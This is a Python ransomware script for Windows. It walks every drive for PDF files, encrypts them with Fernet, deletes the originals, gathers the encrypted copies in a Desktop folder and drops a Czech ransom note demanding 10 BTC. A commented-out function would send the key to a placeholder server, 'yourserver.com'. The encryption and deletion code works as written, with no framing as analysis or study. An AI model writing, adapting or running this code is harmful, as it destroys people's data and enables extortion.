import os
import string
from ctypes import windll
from cryptography.fernet import Fernet
# import requests  # Import the requests library - currently commented out as not used

def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1
    return drives

def encrypt_and_move_file(file_path, key, destination_folder):
    """
    Encrypts the file using the given key and moves the encrypted file to the specified folder.
    If an error occurs, it prints the error and continues with the next file.
    """
    try:
        fernet = Fernet(key)
        with open(file_path, 'rb') as file:
            original = file.read()
        encrypted = fernet.encrypt(original)

        filename = os.path.basename(file_path)
        encrypted_file_path = os.path.join(destination_folder, filename)

        with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

        os.remove(file_path)
        print(f"Successfully encrypted and moved: {file_path}")
    except Exception as e:
        print(f"Failed to encrypt and move {file_path}: {e}")

#def send_key_to_server(key):
    """
    Sends the encryption key to a remote server.
    """
 #   url = "https://yourserver.com/api/keys"
  #  data = {"key": key.decode()}
   # try:
    #    response = requests.post(url, json=data)
     #   response.raise_for_status()
      #  print("Key sent to server successfully.")
    #except requests.exceptions.RequestException as e:
     #   print(f"Failed to send key to server: {e}")


def create_message_file(destination_folder, message):
    """
    Creates a text file containing a specific message in the given folder.
    """
    message_file_path = os.path.join(destination_folder, "message.txt")
    with open(message_file_path, 'w') as message_file:
        message_file.write(message)

# Specific message to the users
user_message = """UPOZORNĚNÍ!!!!
Vaše soubory byly zašifrovány!
Pro další instrukce pro dešifrovací klíč odešlete 10 BTC na tuto bitcoin peněženku: XXXX.
Pokud toto neprovedete klíč smažu a soubory budete mít navždy zašifrované!!!
"""

# Generate encryption key
key = Fernet.generate_key()
print("Encryption Key (save for decryption!):", key.decode())

# Instead of printing the key, functionality to send it to a server is currently commented out
#send_key_to_server(key)

desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
destination_folder = os.path.join(desktop_path, "ATTENTION_REQUIRED")
if not os.path.exists(destination_folder):
    os.makedirs(destination_folder)

# Encrypt and move files, then create the message file in the destination folder
for drive in get_drives():
    drive_letter = f"{drive}:/"
    for dirpath, dirnames, files in os.walk(drive_letter):
        for file in files:
            if file.lower().endswith('.pdf'):
                full_path = os.path.join(dirpath, file)
                print(f"Attempting to encrypt and move: {full_path}")
                encrypt_and_move_file(full_path, key, destination_folder)

# Create the message file after all files have been encrypted and moved
create_message_file(destination_folder, user_message)
